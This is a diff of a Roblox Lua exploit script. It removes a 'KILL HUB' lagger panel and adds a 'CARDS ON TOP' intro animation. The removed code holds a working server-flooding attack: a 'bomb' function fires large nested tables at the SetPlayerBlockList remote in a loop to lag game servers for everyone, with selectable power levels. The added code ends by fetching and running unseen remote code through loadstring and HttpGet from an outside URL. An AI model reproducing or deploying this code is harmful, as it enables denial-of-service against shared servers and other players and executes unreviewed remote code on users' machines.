@@ -1,522 +1,161 @@
---// KILL HUB - PANEL GRADIENTE AZUL GALAXIA CON ESTRELLAS (200x78)
---// EFECTOS: Sombra plateada letra por letra con desvanecimiento + Estrellas animadas
---// Selector de tecla/botÃ³n personalizable (haz clic en el cuadro y pulsa la tecla deseada)
-
---// SERVICES
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
+--// CARDS ON TOP - INTRO, MÜZİK VE SCRIPT YÜKLEYİCİ
 local CoreGui = game:GetService("CoreGui")
-local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local SoundService = game:GetService("SoundService")
 
-local player = Players.LocalPlayer
-local ConfigFile = "KillHubConfig.json"
-
--- ASSET ID PARA EL FONDO
-local BACKGROUND_ASSET_ID = "rbxassetid://107264742623517"
-
--- âš™ï¸ PODER EXACTO: 23 - 32 - 70 - 90 (ULTRA)
-local NIVELES = {
-    Low     = { poder = 23 },
-    Mid     = { poder = 32 },
-    High    = { poder = 70 },
-    Ultra   = { poder = 90 }
-}
-
--- ğŸ”‘ TECLA PREDETERMINADA: M (SIEMPRE M, IGNORA LA CONFIGURACIÃ“N GUARDADA)
-local keybind = Enum.KeyCode.M
-local listeningForInput = false
-local laggerActive = false
-local lagThread = nil
-local nivelActual = "Low"
-local ventanaBloqueada = false
-
--- ğŸ¨ ESTILO AZUL GRADIENTE - COLORES MÃS CLAROS
-local UI_CONFIG = {
-    MainBg       = Color3.fromRGB(0, 0, 0),
-    TitleColor   = Color3.fromRGB(255, 255, 255),
-    TextColor    = Color3.fromRGB(200, 200, 220),
-    ButtonInact  = Color3.fromRGB(60, 60, 70),  -- MÃ¡s claro
-    ButtonLow    = Color3.fromRGB(0, 255, 100),  -- Verde mÃ¡s claro
-    ButtonMid    = Color3.fromRGB(255, 255, 50), -- Amarillo mÃ¡s claro
-    ButtonHigh   = Color3.fromRGB(255, 50, 50),  -- Rojo mÃ¡s claro
-    ButtonUltra  = Color3.fromRGB(160, 50, 255), -- PÃºrpura mÃ¡s claro
-    ToggleOff    = Color3.fromRGB(60, 60, 70),
-    ToggleOn     = Color3.fromRGB(60, 60, 70),
-    LockColor    = Color3.fromRGB(200, 200, 220),
-    UnlockColor  = Color3.fromRGB(150, 150, 170),
-    Font         = Enum.Font.GothamBlack,
-    BorderColor  = Color3.fromRGB(60, 60, 80),
-    GlowColor    = Color3.fromRGB(200, 0, 0),
-    SelectorBg   = Color3.fromRGB(60, 60, 60),
-    SelectorAct  = Color3.fromRGB(0, 200, 0),
-    PurpleText   = Color3.fromRGB(180, 80, 255), -- PÃºrpura mÃ¡s claro
-    BlueStroke   = Color3.fromRGB(50, 150, 255), -- Azul mÃ¡s claro
-    GrayText     = Color3.fromRGB(200, 200, 210), -- Gris mÃ¡s claro
-}
-
--- ğŸ’¾ CONFIG (SOLO GUARDA NIVEL Y BLOQUEO, LA TECLA SIEMPRE ES M)
-local function SaveConfig()
-    local data = {
-        Nivel = nivelActual,
-        Bloqueado = ventanaBloqueada
-    }
-    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
+if CoreGui:FindFirstChild("CardsOnTop_IntroUI") then
+    CoreGui.CardsOnTop_IntroUI:Destroy()
 end
-
-local function LoadConfig()
-    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
-        pcall(function()
-            local data = HttpService:JSONDecode(readfile(ConfigFile))
-            nivelActual = data.Nivel or "Low"
-            ventanaBloqueada = data.Bloqueado or false
-        end)
-    end
-end
-LoadConfig()
-
--- âš ï¸ LAG ENGINE
-local function bomb(poder)
-    local main, spam = {}, {{}}
-    local z = spam[1]
-    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
-    local max = math.min(12000, poder * 50)
-    for i = 1, max do table.insert(main, spam) end
-    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
-end
-
--- ğŸ§© ELEMENTOS
-local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, btnUltra, lockButton
-local titleLabel, textLagger, keybindButton, toggleClick
-local tryhardText
-local strokeLabels = {}
-
--- Funciones de actualizaciÃ³n
-local function actualizarBotonesNivel()
-    -- Low
-    if nivelActual == "Low" then
-        btnLow.BackgroundColor3 = UI_CONFIG.ButtonLow
-        btnLow.TextColor3 = Color3.fromRGB(0, 0, 0)
-        btnLow.BorderSizePixel = 0
-    else
-        btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
-        btnLow.TextColor3 = Color3.fromRGB(200, 200, 220)
-        btnLow.BorderSizePixel = 1
-        btnLow.BorderColor3 = UI_CONFIG.BorderColor
-    end
-    
-    -- Mid
-    if nivelActual == "Mid" then
-        btnMid.BackgroundColor3 = UI_CONFIG.ButtonMid
-        btnMid.TextColor3 = Color3.fromRGB(0, 0, 0)
-        btnMid.BorderSizePixel = 0
-    else
-        btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
-        btnMid.TextColor3 = Color3.fromRGB(200, 200, 220)
-        btnMid.BorderSizePixel = 1
-        btnMid.BorderColor3 = UI_CONFIG.BorderColor
-    end
-    
-    -- High
-    if nivelActual == "High" then
-        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonHigh
-        btnHigh.TextColor3 = Color3.fromRGB(255, 255, 255)
-        btnHigh.BorderSizePixel = 0
-    else
-        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
-        btnHigh.TextColor3 = Color3.fromRGB(200, 200, 220)
-        btnHigh.BorderSizePixel = 1
-        btnHigh.BorderColor3 = UI_CONFIG.BorderColor
-    end
-    
-    -- Ultra
-    if nivelActual == "Ultra" then
-        btnUltra.BackgroundColor3 = UI_CONFIG.ButtonUltra
-        btnUltra.TextColor3 = Color3.fromRGB(255, 255, 255)
-        btnUltra.BorderSizePixel = 0
-        tryhardText.Visible = true
-        tryhardText.TextColor3 = UI_CONFIG.PurpleText
-    else
-        btnUltra.BackgroundColor3 = UI_CONFIG.ButtonInact
-        btnUltra.TextColor3 = Color3.fromRGB(200, 200, 220)
-        btnUltra.BorderSizePixel = 1
-        btnUltra.BorderColor3 = UI_CONFIG.BorderColor
-        tryhardText.Visible = false
-    end
-end
-
-local function actualizarSwitch()
-    if toggleContainer then
-        toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
-    end
-    if toggleBall then
-        toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
-        if laggerActive then
-            toggleBall.Position = UDim2.new(1, -18, 0.5, -9)
-        else
-            toggleBall.Position = UDim2.new(0, 3, 0.5, -9)
-        end
-    end
-    if toggleClick then
-        toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
-        if laggerActive then
-            toggleClick.TextColor3 = Color3.fromRGB(0, 255, 0)
-        else
-            toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0)
-        end
-    end
-end
-
-local function actualizarCandado()
-    lockButton.Text = ventanaBloqueada and "Lock" or "Unlock"
-    lockButton.TextColor3 = ventanaBloqueada and Color3.fromRGB(200, 200, 220) or Color3.fromRGB(150, 150, 170)
-end
-
-local function actualizarKeybindButton()
-    if keybindButton then
-        local display = keybind.Name
-        if display:match("Button") then
-            display = display:gsub("Button", "")
-        end
-        keybindButton.Text = "KEY: " .. display
-    end
-end
-
-local function toggleLagger()
-    laggerActive = not laggerActive
-    local targetPos = laggerActive and UDim2.new(1, -18, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
-    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-        Position = targetPos
-    }):Play()
-
-    toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
-    if laggerActive then
-        toggleClick.TextColor3 = Color3.fromRGB(0, 255, 0)
-    else
-        toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0)
-    end
-
-    if laggerActive then
-        if lagThread then task.cancel(lagThread) end
-        lagThread = task.spawn(function()
-            while laggerActive do
-                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
-                bomb(NIVELES[nivelActual].poder)
-                task.wait(0.18)
-            end
-        end)
-    else
-        if lagThread then task.cancel(lagThread); lagThread = nil end
-    end
-end
-
--- ğŸ–¼ï¸ INTERFAZ - MÃS GRANDE
-if CoreGui:FindFirstChild("KillHub_UI") then CoreGui.KillHub_UI:Destroy() end
 
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "KillHub_UI"
+screenGui.Name = "CardsOnTop_IntroUI"
 screenGui.Parent = CoreGui
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.ResetOnSpawn = false
 
--- Panel mÃ¡s grande
-local mainFrame = Instance.new("Frame")
-mainFrame.Name = "MainFrame"
-mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-mainFrame.BackgroundTransparency = 0
-mainFrame.BorderSizePixel = 2
-mainFrame.BorderColor3 = Color3.fromRGB(0, 80, 180)
-mainFrame.Size = UDim2.new(0, 260, 0, 100)  -- MÃ¡s grande (era 200x78)
-mainFrame.Position = UDim2.new(0.15, 0, 0.5, -50)
-mainFrame.Parent = screenGui
-mainFrame.ClipsDescendants = true
-
--- Esquinas redondeadas
-local mainCorner = Instance.new("UICorner", mainFrame)
-mainCorner.CornerRadius = UDim.new(0, 25)  -- MÃ¡s redondeado
-
--- ğŸ“· IMAGEN DE FONDO
-local backgroundImage = Instance.new("ImageLabel", mainFrame)
-backgroundImage.Name = "BackgroundImage"
-backgroundImage.BackgroundTransparency = 1
-backgroundImage.Size = UDim2.new(1, 0, 1, 0)
-backgroundImage.Position = UDim2.new(0, 0, 0, 0)
-backgroundImage.Image = BACKGROUND_ASSET_ID
-backgroundImage.ImageTransparency = 0
-backgroundImage.ScaleType = Enum.ScaleType.Crop
-backgroundImage.ZIndex = 0
-
-local bgCorner = Instance.new("UICorner", backgroundImage)
-bgCorner.CornerRadius = UDim.new(0, 25)
-
--- ğŸŒŒ GRADIENTE AZUL GALAXIA (mÃ¡s claro)
-local gradient = Instance.new("UIGradient", mainFrame)
-gradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 30, 80)),
-    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(30, 50, 120)),
-    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(50, 80, 160)),
-    ColorSequenceKeypoint.new(0.85, Color3.fromRGB(80, 140, 210)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 190, 240))
-})
-gradient.Rotation = 90
-gradient.Transparency = NumberSequence.new(0.3)
-
--- â­ ESTRELLAS ANIMADAS
-local stars = {}
-for i = 1, 30 do
-    local star = Instance.new("Frame", mainFrame)
-    star.BackgroundColor3 = Color3.fromRGB(220, 220, 240)
-    star.BorderSizePixel = 0
-    star.Size = UDim2.new(0, 1 + math.random() * 3, 0, 1 + math.random() * 3)
-    star.Position = UDim2.new(math.random(), 0, math.random(), 0)
-    star.ZIndex = 1
-    star.BackgroundTransparency = 0.3 + math.random() * 0.5
-    
-    local corner = Instance.new("UICorner", star)
-    corner.CornerRadius = UDim.new(1, 0)
-    
-    table.insert(stars, {
-        frame = star,
-        transparency = star.BackgroundTransparency,
-        timer = 2 + math.random() * 3,
-        elapsed = 0
-    })
-end
+-- Müzik (ID: 76650356472656)
+local introSound = Instance.new("Sound")
+introSound.Name = "CardsOnTopIntroSound"
+introSound.SoundId = "rbxassetid://76650356472656"
+introSound.Volume = 1
+introSound.Looped = false
+introSound.Parent = SoundService
 
 task.spawn(function()
-    while true do
-        for _, starData in ipairs(stars) do
-            starData.elapsed = starData.elapsed + 0.05
-            if starData.elapsed >= starData.timer then
-                starData.elapsed = 0
-                starData.timer = 2 + math.random() * 3
-                
-                local star = starData.frame
-                TweenService:Create(star, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
-                    BackgroundTransparency = 1
-                }):Play()
-                
-                task.wait(0.3)
-                
-                star.Position = UDim2.new(math.random(), 0, math.random(), 0)
-                local newSize = 1 + math.random() * 3
-                star.Size = UDim2.new(0, newSize, 0, newSize)
-                
-                TweenService:Create(star, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
-                    BackgroundTransparency = starData.transparency
-                }):Play()
-            end
-        end
-        task.wait(0.1)
+    local loadStarted = tick()
+    while not introSound.IsLoaded and tick() - loadStarted < 8 do
+        task.wait(0.05)
+    end
+    if not introSound.Parent then return end
+    pcall(function()
+        introSound.TimePosition = 3
+        introSound:Play()
+    end)
+    task.wait(20)
+    if introSound and introSound.Parent then
+        pcall(function() introSound:Stop() end)
+        introSound:Destroy()
     end
 end)
 
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--- TÃTULO "KILL HUB" - MÃS GRANDE
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-local function crearContornoAzul()
-    local offsets = {
-        {-1.5, -1.5}, {0, -1.5}, {1.5, -1.5},
-        {-1.5, 0},              {1.5, 0},
-        {-1.5, 1.5}, {0, 1.5},  {1.5, 1.5}
-    }
-    
-    for _, offset in ipairs(offsets) do
-        local stroke = Instance.new("TextLabel", mainFrame)
-        stroke.BackgroundTransparency = 1
-        stroke.Position = UDim2.new(0, 4 + offset[1], 0, -1 + offset[2])
-        stroke.Size = UDim2.new(0, 120, 0, 32)  -- MÃ¡s grande
-        stroke.Font = Enum.Font.GothamBlack
-        stroke.Text = "KILL HUB"
-        stroke.TextColor3 = UI_CONFIG.BlueStroke
-        stroke.TextSize = 24  -- MÃ¡s grande
-        stroke.TextXAlignment = Enum.TextXAlignment.Left
-        stroke.TextYAlignment = Enum.TextYAlignment.Center
-        stroke.ZIndex = 3
-        stroke.ClipsDescendants = false
-        table.insert(strokeLabels, stroke)
-    end
-end
+-- Arayüz Çerçevesi
+local introFrame = Instance.new("Frame")
+introFrame.Name = "IntroFrame"
+introFrame.Parent = screenGui
+introFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+introFrame.BackgroundTransparency = 1
+introFrame.BorderSizePixel = 0
+introFrame.Size = UDim2.new(1, 0, 1, 0)
+introFrame.Position = UDim2.new(0, 0, 0, 0)
+introFrame.ZIndex = 100
 
-crearContornoAzul()
+-- Ana Yazı: CARDS ON TOP
+local introText = Instance.new("TextLabel")
+introText.Name = "IntroText"
+introText.Parent = introFrame
+introText.BackgroundTransparency = 1
+introText.AnchorPoint = Vector2.new(0.5, 0.5)
+introText.Position = UDim2.new(0.5, 0, -0.22, 0)
+introText.Size = UDim2.new(0.9, 0, 0, 70)
+introText.Font = Enum.Font.GothamBlack
+introText.Text = "CARDS ON TOP"
+introText.TextColor3 = Color3.fromRGB(255, 255, 255)
+introText.TextStrokeColor3 = Color3.fromRGB(170, 10, 35)
+introText.TextStrokeTransparency = 0.05
+introText.TextScaled = true
+introText.Rotation = -16
+introText.ZIndex = 102
 
--- Main title text (GRAY)
-titleLabel = Instance.new("TextLabel", mainFrame)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Position = UDim2.new(0, 4, 0, -1)
-titleLabel.Size = UDim2.new(0, 120, 0, 32)
-titleLabel.Font = Enum.Font.GothamBlack
-titleLabel.Text = "KILL HUB"
-titleLabel.TextColor3 = UI_CONFIG.GrayText
-titleLabel.TextSize = 24
-titleLabel.TextXAlignment = Enum.TextXAlignment.Left
-titleLabel.TextYAlignment = Enum.TextYAlignment.Center
-titleLabel.ZIndex = 4
-titleLabel.ClipsDescendants = false
+local introGradient = Instance.new("UIGradient")
+introGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(0.45, Color3.fromRGB(255, 165, 180)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 20, 50))
+})
+introGradient.Rotation = 90
+introGradient.Parent = introText
 
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--- TEXTO "Only for tryhards"
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-tryhardText = Instance.new("TextLabel", mainFrame)
-tryhardText.BackgroundTransparency = 1
-tryhardText.Position = UDim2.new(0, 8, 0, 88)  -- Ajustado para GUI mÃ¡s grande
-tryhardText.Size = UDim2.new(0, 150, 0, 12)
-tryhardText.Font = Enum.Font.GothamBlack
-tryhardText.Text = "Only for tryhards"
-tryhardText.TextColor3 = UI_CONFIG.PurpleText
-tryhardText.TextSize = 10
-tryhardText.TextXAlignment = Enum.TextXAlignment.Left
-tryhardText.TextYAlignment = Enum.TextYAlignment.Center
-tryhardText.ZIndex = 2
-tryhardText.Visible = false
+-- Gölge Yazı
+local introShadow = Instance.new("TextLabel")
+introShadow.Name = "IntroShadow"
+introShadow.Parent = introFrame
+introShadow.BackgroundTransparency = 1
+introShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+introShadow.Position = UDim2.new(0.5, 4, -0.22, 4)
+introShadow.Size = UDim2.new(0.9, 0, 0, 70)
+introShadow.Font = Enum.Font.GothamBlack
+introShadow.Text = "CARDS ON TOP"
+introShadow.TextColor3 = Color3.fromRGB(220, 15, 45)
+introShadow.TextTransparency = 0.35
+introShadow.TextStrokeTransparency = 1
+introShadow.TextScaled = true
+introShadow.Rotation = -16
+introShadow.ZIndex = 101
 
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--- BOTONES KEY Y LOCK
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-keybindButton = Instance.new("TextButton", mainFrame)
-keybindButton.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-keybindButton.BackgroundTransparency = 0.2
-keybindButton.Position = UDim2.new(1, -78, 0, 2)
-keybindButton.Size = UDim2.new(0, 42, 0, 14)
-keybindButton.Font = Enum.Font.GothamBlack
-keybindButton.Text = "KEY: M"
-keybindButton.TextColor3 = Color3.fromRGB(200, 200, 220)
-keybindButton.TextSize = 7
-keybindButton.AutoButtonColor = false
-keybindButton.ZIndex = 2
-Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 7)
-actualizarKeybindButton()
+local introScale = Instance.new("UIScale")
+introScale.Parent = introText
+introScale.Scale = 0.4
 
-lockButton = Instance.new("TextButton", mainFrame)
-lockButton.BackgroundTransparency = 0
-lockButton.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-lockButton.BackgroundTransparency = 0.2
-lockButton.Position = UDim2.new(1, -36, 0, 2)
-lockButton.Size = UDim2.new(0, 32, 0, 14)
-lockButton.Font = Enum.Font.GothamBlack
-lockButton.TextSize = 7
-lockButton.TextColor3 = Color3.fromRGB(200, 200, 220)
-lockButton.AutoButtonColor = false
-lockButton.ZIndex = 2
-Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0, 7)
-lockButton.MouseButton1Click:Connect(function()
-    ventanaBloqueada = not ventanaBloqueada
-    actualizarCandado()
-    SaveConfig()
-end)
-actualizarCandado()
+local shadowScale = Instance.new("UIScale")
+shadowScale.Parent = introShadow
+shadowScale.Scale = 0.4
 
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--- "LAGGER"
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-textLagger = Instance.new("TextLabel", mainFrame)
-textLagger.BackgroundTransparency = 1
-textLagger.Position = UDim2.new(0, 8, 0, 30)
-textLagger.Size = UDim2.new(0, 80, 0, 22)
-textLagger.Font = Enum.Font.GothamBlack
-textLagger.Text = "LAGGER"
-textLagger.TextColor3 = Color3.fromRGB(200, 200, 220)
-textLagger.TextSize = 14
-textLagger.TextXAlignment = Enum.TextXAlignment.Left
-textLagger.TextYAlignment = Enum.TextYAlignment.Center
-textLagger.ZIndex = 2
+-- Animasyonlar
+local fallTween = TweenService:Create(
+    introText,
+    TweenInfo.new(0.75, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
+    {Position = UDim2.new(0.5, 0, 0.5, 0), Rotation = 0}
+)
 
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--- SWITCH - MÃS GRANDE
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-toggleContainer = Instance.new("Frame", mainFrame)
-toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
-toggleContainer.Position = UDim2.new(1, -62, 0, 30)
-toggleContainer.Size = UDim2.new(0, 52, 0, 22)
-toggleContainer.ZIndex = 2
-Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)
+local shadowFallTween = TweenService:Create(
+    introShadow,
+    TweenInfo.new(0.75, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
+    {Position = UDim2.new(0.5, 4, 0.5, 4), Rotation = 0}
+)
 
-toggleBall = Instance.new("Frame", toggleContainer)
-toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
-toggleBall.Size = UDim2.new(0, 20, 0, 20)
-toggleBall.Position = UDim2.new(0, 2, 0.5, -10)
-toggleBall.ZIndex = 2
-Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)
+local scaleTween = TweenService:Create(
+    introScale,
+    TweenInfo.new(0.75, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+    {Scale = 1}
+)
 
-toggleClick = Instance.new("TextButton", toggleContainer)
-toggleClick.BackgroundTransparency = 0
-toggleClick.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-toggleClick.Size = UDim2.new(1,0,1,0)
-toggleClick.ZIndex = 3
-toggleClick.Font = Enum.Font.GothamBlack
-toggleClick.Text = "INACTIVE"
-toggleClick.TextSize = 7
-toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0)
-toggleClick.TextXAlignment = Enum.TextXAlignment.Center
-toggleClick.TextYAlignment = Enum.TextYAlignment.Center
-toggleClick.MouseButton1Click:Connect(toggleLagger)
-toggleClick.AutoButtonColor = false
-local corner = Instance.new("UICorner", toggleClick)
-corner.CornerRadius = UDim.new(1,0)
+local shadowScaleTween = TweenService:Create(
+    shadowScale,
+    TweenInfo.new(0.75, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+    {Scale = 1}
+)
 
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--- SELECTOR DE TECLA
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-keybindButton.MouseButton1Click:Connect(function()
-    if listeningForInput then return end
-    listeningForInput = true
-    keybindButton.Text = "KEY: ..."
-    keybindButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
-    keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
-end)
+fallTween:Play()
+shadowFallTween:Play()
+scaleTween:Play()
+shadowScaleTween:Play()
 
-local inputConnection
-inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
-    if not listeningForInput then return end
-    if gp then return end
+task.spawn(function()
+    fallTween.Completed:Wait()
+    task.wait(1.47)
 
-    local newKey = nil
-    if input.KeyCode ~= Enum.KeyCode.Unknown then
-        newKey = input.KeyCode
-    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
-        newKey = input.KeyCode
-    end
+    local fadeText = TweenService:Create(
+        introText,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+        {TextTransparency = 1, TextStrokeTransparency = 1, Rotation = 4, Position = UDim2.new(0.5, 0, 0.42, 0)}
+    )
 
-    if newKey then
-        keybind = newKey
-        actualizarKeybindButton()
-        listeningForInput = false
-        keybindButton.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-        keybindButton.BackgroundTransparency = 0.2
-        keybindButton.TextColor3 = Color3.fromRGB(200, 200, 220)
-    end
-end)
+    local fadeShadow = TweenService:Create(
+        introShadow,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+        {TextTransparency = 1, Position = UDim2.new(0.5, 4, 0.42, 4)}
+    )
 
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--- BOTONES LOW/MID/HIGH/ULTRA - MÃS GRANDES
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-local btnY = 58
-local btnW = 54
-local btnH = 24
-local espaciado = 4
-local margenIzq = 5
+    fadeText:Play()
+    fadeShadow:Play()
+    task.wait(0.32)
 
-local function crearBoton(texto, posX)
-    local btn = Instance.new("TextButton", mainFrame)
-    btn.Size = UDim2.new(0, btnW, 0, btnH)
-    btn.Position = UDim2.new(0, posX, 0, btnY)
-    btn.Font = UI_CONFIG.Font
-    btn.Text = texto
-    btn.TextColor3 = Color3.fromRGB(200, 200, 220)
-    btn.TextSize = 10
-    btn.AutoButtonColor = false
-    btn.BackgroundColor3 = UI_CONFIG.ButtonInact
-    btn.BorderSizePixel = 1
-    btn.BorderColor3 = UI_CONFIG.BorderColor
-    btn.ZIndex = 2
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
-    return btn
-end
+    screenGui:Destroy()
 
-btnLow = crearBoton("LOW", margenIzq)
-btnLow.MouseButton1Click:Connect(function()
-    nivelActual = "Low"
-    actualizarBotonesNivel()
-    SaveConfig()
+    -- Animasyon bittikten sonra istediğin loadstring kodunu çalıştırır
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/bQ5f2CxbVwFyxo0Z/raw"))()
+        end)
+    end)
 end)
